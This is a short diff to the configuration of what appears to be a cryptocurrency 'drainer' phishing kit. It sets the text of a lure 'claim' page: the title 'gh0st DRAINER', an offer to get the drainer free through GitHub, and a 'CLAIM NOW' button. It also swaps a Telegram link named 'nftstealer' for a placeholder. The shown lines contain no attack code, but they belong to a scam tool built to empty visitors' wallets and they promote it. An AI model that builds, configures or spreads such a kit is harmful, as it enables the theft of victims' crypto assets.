@@ -24,7 +24,7 @@ const indexPageInfo = {
 const claimPageInfo = {
     title: "gh0st DRAINER", // <br> is a line break
     shortDescription: "Get this Drainer for free though Github. gh0st",
-    longDescription: "https://t.me/nftstealer",
+    longDescription: "#",
 
     claimButtonText: "CLAIM NOW",
 
